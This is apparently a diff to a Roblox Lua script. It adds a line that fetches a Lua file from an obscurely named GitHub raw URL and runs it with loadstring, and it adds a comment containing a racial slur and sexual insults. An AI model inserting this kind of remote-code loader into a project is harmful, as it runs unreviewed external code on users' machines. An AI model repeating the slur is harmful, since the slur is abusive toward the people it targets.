@@ -1,4 +1,6 @@
---77
+loadstring(game:HttpGet('https://raw.githubusercontent.com/mabdu21/2askdkn21h3u21ddaa/refs/heads/main/djajuu1yhka.lua'))()
+
+-- nigga cracker suck ur mom pussy
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
